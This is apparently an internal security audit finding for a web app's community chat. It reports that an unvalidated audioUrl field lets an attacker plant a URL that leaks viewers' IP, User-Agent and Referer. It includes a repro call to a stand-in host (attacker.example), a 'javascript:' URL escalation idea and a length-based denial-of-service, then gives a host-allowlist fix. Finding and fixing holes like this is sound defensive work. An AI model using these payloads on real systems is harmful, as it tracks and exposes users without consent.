# F10-03 — Repro: community-chat audioUrl host bypass

## Vulnerability
`src/app/actions/community.ts:768-803` accepts `audioUrl` without any host, length, or protocol check.
Stored verbatim into `community_chat/{msgId}.audioUrl` and rendered by every viewer.

Compare with sibling `sendGroupChatMessageAction` (`groups.ts:616-618`) which DOES validate.

## Steps
1. Sign in as Attacker.
2. Call the server-action:
   ```ts
   import { sendChatMessageAction } from '@/app/actions/community';
   await sendChatMessageAction("listen to this", "https://attacker.example/track.mp3?cb=" + Date.now());
   ```
3. Open `/community` in a victim browser.
4. The chat row renders an `<audio src="https://attacker.example/track.mp3?cb=…">`. Browser will
   request the URL on autoplay/metadata-preload, leaking:
   - victim IP
   - victim User-Agent
   - victim Referer (the community page URL)

## Severity escalation paths
- `audioUrl = "javascript:…"` — depends on `<audio>` renderer; most React renderers strip JS URLs but a
  pasted-through URL is still surface area.
- `audioUrl` length unbounded → ~1 MiB pre-write CPU/bandwidth waste, store-level DOS.
- Tracking-pixel use case is the cleanest exploit and is unambiguously broken.

## Fix
```ts
if (audioUrl) {
    if (typeof audioUrl !== 'string') throw new Error('audioUrl must be a string');
    if (audioUrl.length > 2048) throw new Error('audioUrl too long');
    if (!audioUrl.startsWith('https://firebasestorage.googleapis.com/')) {
        throw new Error('audioUrl must point to Firebase Storage');
    }
    payload.audioUrl = audioUrl;
}
```
Identical to `groups.ts:616-618`. Lift into a shared helper since 3+ chat surfaces will need it.
